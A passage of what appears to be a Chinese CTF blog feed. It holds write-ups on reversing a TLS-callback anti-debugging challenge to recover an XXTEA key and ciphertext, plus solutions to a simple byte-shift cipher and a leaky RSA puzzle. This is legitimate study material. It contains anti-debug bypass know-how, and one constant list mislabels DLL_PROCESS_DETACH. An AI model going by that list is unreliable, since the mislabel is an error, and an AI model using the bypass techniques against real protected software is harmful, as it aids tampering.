<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span><span class="comment">//如果 `Process32FirstW` 失败，表示没有进程信息可枚举，直接关闭句柄并返回 `0`。</span></span><br><span class="line">&#123;</span><br><span class="line">  CloseHandle(hSnapshot);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>似乎中间有个死循环，怪不得动调了一阵子都动不了……</p><p>再改：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812003624975.png" alt="image-20240812003624975"></p><p>终于对了：<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812004235808.png" alt="image-20240812004235808"></p><p>题目是TLS，看旁边函数</p><h4 id="TlsCallback-0："><a href="#TlsCallback-0：" class="headerlink" title="TlsCallback_0："></a>TlsCallback_0：</h4><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000053323.png" alt="image-20240812000053323"></p><p>学到一个很好的修改检测反调试方法：</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000405368.png" alt="image-20240812000405368"></p><blockquote><p> 师傅说：（记笔记）<img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812000131184.png" alt="image-20240812000131184"></p></blockquote><p>不太懂TLScallback，去网上搜索</p><p>首先是TLS：</p><blockquote><p>Thread Local Storage，线程局部存储：各线程独立的数据存储空间。使用TLS技术可以在线程内部独立使用或修改进程的全局数据或静态数据， 就像对待自身的局部变量一样</p><p>TLS回调函数常用于反调试，主要是利用了TLS回调函数的调用要先于EP代码的执行</p><p>如果开启了TLS功能，PE文件头就会设置TLS表，IMAGE_NT_HEADERS-IMAGE_OPTIONAL_HEADER-IMAGE_DATA_DIRECTORY[9]描述了IMAGE_TLS_DIRECTORY结构体的位置。</p><p># 作者(Author)：chillysome<br># 链接(URL)：<a href="http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/">http://www.chillysome.top/index.php/2024/03/15/tls%e5%9b%9e%e8%b0%83%e5%87%bd%e6%95%b0-%e4%b8%80%e6%96%87%e7%9c%8b%e6%87%82%ef%bc%88%e8%af%a6%ef%bc%89/</a></p></blockquote><p>所以上面while循环有9次，似乎也有些关系</p><p>继续搜，TLS回调函数，每当创建或终止进程的线程时会自动调用执行的函数。</p><p>参数顺序和定义是一样的，第一个参数是模块句柄、第二个标识调用TLS回调函数原因，有4：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_ATTACH 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_THREAD_DETACH 3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DLL_PROCESS_ATTACH 0</span></span><br><span class="line"><span class="comment">//主线程调用main前调用TLS回调函数，调用原因为DLL_PROCESS_ATTACH</span></span><br><span class="line"><span class="comment">//子线程启动前调用TLS，原因为DLL_THREAD_ATTACH</span></span><br><span class="line"><span class="comment">//子线程结束后调用TLS，原因为DLL_THREAD_DETACH</span></span><br><span class="line"><span class="comment">//主线程结束后调用TLS 原因为DLL_PROCESS_DETACH</span></span><br></pre></td></tr></table></figure><p>而运行时调用顺序，1–2–3–0</p><h3 id="运行流程："><a href="#运行流程：" class="headerlink" title="运行流程："></a>运行流程：</h3><ul><li>进入case1，检测调试器，存在则卡死进程；通过main函数中CreateThread，接着WaitForSingleObject等待线程结束</li><li>线程进入case2，反反调试检擦，接着对sub_4a7000修改，动调进入sub_4013B0运行取出key；接着调用sub_401500进入sub_401170，base64加密</li><li>进入case3，sub_401500的调用改为sub_4013B0</li><li>退出线程，进入main中sub_401500，进行xxtea加密，比较不相同，退出进程</li><li>进入case0，TLS最后的check函数，检测后输出True</li></ul><h4 id="动调："><a href="#动调：" class="headerlink" title="动调："></a>动调：</h4><p>（一定要应用修改于程序……（Edit–&gt;</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812010612755.png" alt="image-20240812010612755"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812011907961.png" alt="image-20240812011907961"></p><p>Qu7e3T0yEknVghYa6vf1oOsF94H+LxIqbtKpzw8U5CJN2XlZRPM&#x2F;SdAWDGcjBimr</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812012210949.png" alt="image-20240812012210949"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812012718410.png" alt="image-20240812012718410"></p><p>发现跳转至4013B0,</p><p>P命令构建函数，是xxtea加密，</p><p>取出key：</p><p>0x74,0x404,0xBF,0x2652</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20240812011228728.png" alt="image-20240812011228728"></p><p>取出密文：</p><p>dd 3400A0D0h, 0B23CFFEBh, 0CDE69111h, 32D0771h, 0FA1D9E6Ch<br>.data:004A7450                 dd 9D15360Ah, 933EBF03h, 9F12DDA6h, 8C58DDA1h, 46BEE3E0h<br>.data:004A7464                 dd 4476F65h, 3C44CEF9h</p><p>顺序求解就ok</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;BUUCTF-2023-WEEK4-REVERSE-kooh-slT&quot;&gt;&lt;a href=&quot;#BUUCTF-2023-WEEK4-REVERSE-kooh-slT&quot; class=&quot;headerlink&quot; title=&quot;BUUCTF 2023 WEEK4|REVERS</summary>
      
    
    
    
    
    <category term="CTF TLS" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF-TLS/"/>
    
  </entry>
  
  <entry>
    <title>西瓜杯</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/07/09/%E8%A5%BF%E7%93%9C%E6%9D%AF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/07/09/%E8%A5%BF%E7%93%9C%E6%9D%AF/</id>
    <published>2024-07-08T16:00:00.000Z</published>
    <updated>2024-09-16T07:17:41.504Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西瓜杯"><a href="#西瓜杯" class="headerlink" title="西瓜杯"></a>西瓜杯</h1><p><a href="https://ctf.show/challenges#%E8%A5%BF%E7%93%9C%E6%9D%AF%E5%AE%98%E6%96%B9wp-4415">比赛平台</a></p><p><a href="https://docs.qq.com/doc/DRmVUb1lOdmFMYmx1">wp</a></p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="他说他想结婚"><a href="#他说他想结婚" class="headerlink" title="他说他想结婚"></a>他说他想结婚</h3><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="奇怪的条形码"><a href="#奇怪的条形码" class="headerlink" title="奇怪的条形码"></a>奇怪的条形码</h3><p>一道misc，，ppt改图片长款</p><h3 id="简单密码"><a href="#简单密码" class="headerlink" title="简单密码"></a>简单密码</h3><p>没看出来</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">647669776d757e83817372816e707479707c888789757c92788d84838b878d9d</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_string</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将输入的字符串进行加密，逐个字节递增加&quot;&quot;&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytearray</span>(s, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        encrypted_bytes[i] += (i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_bytes.<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">hex_string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;将加密后的16进制字符串解密&quot;&quot;&quot;</span></span><br><span class="line">    encrypted_bytes = <span class="built_in">bytearray</span>.fromhex(hex_string)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(encrypted_bytes)):</span><br><span class="line">        encrypted_bytes[i] -= (i + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> encrypted_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;选择功能：&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;1. 加密字符串&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;2. 解密字符串&quot;</span>)</span><br><span class="line">    choice = <span class="built_in">input</span>(<span class="string">&quot;输入你的选择（1 或 2）：&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> choice == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        plaintext = <span class="built_in">input</span>(<span class="string">&quot;输入要加密的字符串：&quot;</span>)</span><br><span class="line">        encrypted_string = encrypt_string(plaintext)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;加密后的字符串：<span class="subst">&#123;encrypted_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> choice == <span class="string">&#x27;2&#x27;</span>:</span><br><span class="line">        hex_string = <span class="built_in">input</span>(<span class="string">&quot;输入加密后的16进制字符串：&quot;</span>)</span><br><span class="line">        decrypted_string = decrypt_string(hex_string)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;解密后的字符串：<span class="subst">&#123;decrypted_string&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;无效的选择，请输入1或2。&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="factor"><a href="#factor" class="headerlink" title="factor"></a>factor</h3><p>题目：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> enc <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">hint = os.urandom(<span class="number">36</span>)</span><br><span class="line">tmp = bytes_to_long(hint)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">d = getPrime(<span class="number">400</span>)</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">e = gmpy2.invert(d,phi)</span><br><span class="line">n = p*q</span><br><span class="line">c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">leak1 = p^tmp</span><br><span class="line">leak2 = q^tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;n = <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;e = <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;c = <span class="subst">&#123;c&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak1 = <span class="subst">&#123;leak1&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;leak2 = <span class="subst">&#123;leak2&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 145462084881728813723574366340552281785604069047381248513937024180816353963950721541845665931261230969450819680771925091152670386983240444354412170994932196142227905635227116456476835756039585419001941477905953429642459464112871080459522266599791339252614674500304621383776590313803782107531212756620796159703</span></span><br><span class="line"><span class="string">e = 10463348796391625387419351013660920157452350067191419373870543363741187885528042168135531161031114295856009050029737547684735896660393845515549071092389128688718675573348847489182651631515852744312955427364280891600765444324519789452014742590962030936762237037273839906251320666705879080373711858513235704113</span></span><br><span class="line"><span class="string">c = 60700608730139668338977678601901211800978306010063875269252006068222163102100346920465298044880066999492746508990629867396189713753873657197546664480233269806308415874191048149900822050054539774370134460339681949131037133783273410066318511508768512778132786573893529705068680583697574367357381635982316477364</span></span><br><span class="line"><span class="string">leak1 = 13342820281239625174817085182586822673810894195223942279061039858850534510679297962596800315875604798047264337469828123370586584840078728059729121435462780</span></span><br><span class="line"><span class="string">leak2 = 10901899434728393473569359914062349292412269512201554924835672710780580634465799069211035290729536290605761024818770843901501694556825737462457471235151530</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/png;base64,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